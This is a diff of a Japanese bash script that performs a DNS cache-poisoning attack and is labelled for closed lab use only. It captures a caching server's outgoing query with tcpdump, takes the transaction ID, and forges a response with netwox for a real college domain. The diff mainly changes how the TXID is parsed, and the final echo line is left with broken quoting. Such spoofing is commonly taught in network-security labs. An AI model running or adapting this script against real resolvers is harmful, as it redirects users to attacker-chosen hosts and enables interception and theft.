@@ -1,7 +1,8 @@
 #!/bin/bash
 # auto_dns_spoof.sh
-# DNSキャッシュ汚染実験用（自動でTXID取得して偽応答送信）
-# 注意: 閉じたラボ環境専用
+# DNSキャッシュ汚染実験用（TXID自動取得版）
+# Ubuntu 22.04 + netwox 環境対応
+# 閉じたラボ環境専用
 
 # ==== 設定 ====
 CACHE_DNS="192.168.56.102"   # キャッシュDNSサーバ
@@ -11,10 +12,15 @@ DOMAIN="www.kochi-ct.ac.jp"  # 攻撃対象ドメイン
 TTL="300"                     # キャッシュTTL
 TMP_BIN="/tmp/dns_response.bin"
 
-# ==== DNS問い合わせパケットを監視してTXID取得 ====
-echo "[*] キャッシュサーバからのDNS問い合わせを監視..."
-TXID=$(sudo tcpdump -l -n -i any "udp and src $CACHE_DNS and dst port 53" -c 1 \
-      | awk '{match($0,/0x[0-9a-fA-F]{4}/,a); print a[0]}')
+# ==== TXID取得 ====
+echo "[*] キャッシュサーバからのDNS問い合わせを監視中..."
+echo "[*] tcpdumpで1件のDNS問い合わせをキャプチャします..."
+
+# tcpdumpでDNSパケットを1件キャプチャし、最初の2バイト(トランザクションID)を取得
+TXID=$(sudo tcpdump -n -i any -c 1 "udp and src $CACHE_DNS and dst port 53" -vv -XX \
+  | grep -A1 "0x0000:" \
+  | tail -n1 \
+  | awk '{print "0x"$1$2}')
 
 if [ -z "$TXID" ]; then
     echo "[!] TXIDを取得できませんでした"
@@ -34,7 +40,7 @@ sudo netwox 28 \
   -f 1 > $TMP_BIN
 
 if [ $? -ne 0 ]; then
-    echo "[!] DNSパケット作成に失敗しました"
+    echo "[!] DNSレスポンス作成に失敗しました"
     exit 1
 fi
 
@@ -52,4 +58,4 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 
-echo "[*] 偽応答送信完了。キャッシュサーバのキャッシュを確認してください。"
+echo "[*] 偽応答送信完了。キャッシュサーバのキャッシュを確認してください。*]()
